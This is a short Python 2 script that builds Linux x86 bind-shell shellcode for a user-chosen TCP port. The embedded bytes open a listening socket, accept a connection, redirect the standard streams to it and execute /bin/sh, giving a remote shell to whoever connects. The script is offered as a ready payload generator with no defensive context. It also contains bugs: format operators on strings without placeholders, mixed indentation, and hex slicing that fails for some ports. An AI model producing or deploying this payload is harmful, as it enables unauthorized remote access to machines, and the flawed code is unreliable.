#!/usr/bin/python
import sys

if len(sys.argv) != 2:
	print "usage ./%s <TCP port> "% sys.argv[0]
	sys.exit(-1)


port = int(sys.argv[1])
if port<1023:
	print "You must be root to run it!"% sys.argv[0]
        sys.exit(-2)
if port>65535:
	print "You can't set a port higher than 65535!"% sys.argv[0]
        sys.exit(-3)

aux = hex(port)
aux2 = aux[aux.find("x")+1:-2]
aux2 = int(aux2,16)
shellport =""

if aux2<16:
	shellport = bytearray("\\x0"+str(aux[aux.find("x")+1:-2])+"\\x"+str(aux[-2:]))
else:
	shellport = bytearray("\\x"+str(aux[aux.find("x")+1:-2])+"\\x"+str(aux[-2:]))

shellcode_part1 = bytearray("\\x31\\xc0\\xb0\\x66\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x97\\x31\\xc0\\x50\\x66\\x68")
shellcode_part2 = bytearray("\\x43\\x66\\x53\\x89\\xe1\\xb0\\x66\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x57\\xb0\\x66\\xb3\\x04\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x50\\x50\\x57\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80")

ret = '"'+shellcode_part1+shellport+shellcode_part2+'"'
print ret
